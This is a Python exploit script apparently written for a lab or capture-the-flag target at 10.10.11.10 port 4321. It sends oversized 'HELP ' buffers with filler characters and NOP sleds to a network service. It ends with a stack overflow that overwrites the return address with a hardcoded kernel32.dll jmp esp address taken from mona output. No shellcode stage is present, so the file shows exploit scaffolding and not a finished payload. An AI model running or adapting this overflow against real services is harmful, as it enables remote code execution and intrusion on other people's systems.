#!/usr/bin/python

import socket
import os
import sys
import time
host = "10.10.11.10"
port = 4321




time.sleep(1)
buffer = 'HELP '

buffer += "B" * 56
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(1)


s.send(buffer)

time.sleep(1)
s.close()


for count in range(1,6):
	time.sleep(1)
	buffer = 'HELP '
	buffer += "\x90" * 50
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	time.sleep(1)
	s.send(buffer)
	time.sleep(1)
	s.close()






time.sleep(1)
buffer = 'HELP '

buffer += "C" * 56
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(1)


s.send(buffer)

time.sleep(1)
s.close()



time.sleep(1)
buffer = 'HELP '

buffer += "D" * 56
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(1)


s.send(buffer)

time.sleep(1)
s.close()






time.sleep(1)
buffer = 'HELP '

buffer += "E" * 56
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(1)


s.send(buffer)

time.sleep(1)
s.close()






time.sleep(1)
buffer = 'HELP '

buffer += "F" * 56
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(1)


s.send(buffer)

time.sleep(1)
s.close()



time.sleep(1)
buffer = 'HELP '

buffer += "G" * 56
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(1)


s.send(buffer)

time.sleep(1)
s.close()










buffer = 'HELP '
buffer += 'A' * 7
#buffer += 'CCCC'
#the cccc is what you replace with the address
#buffer += 'CCCC'

#0x77e766e2 : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] AS
#output of !mona jmp -r esp
#0x7c836a78  

buffer += '\x78\x6a\x83\x7c'
buffer += '(('
buffer += "B" * 44
# ABCDEFGHIJK(((((((((('
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
#print s.recv(1024)
time.sleep(1)
#s.send("HELP ")
#time.sleep(1)
#print s.recv(1024)
#buffer = "HELP " + buffer
s.send(buffer)
#print s.recv(1024)
time.sleep(1)
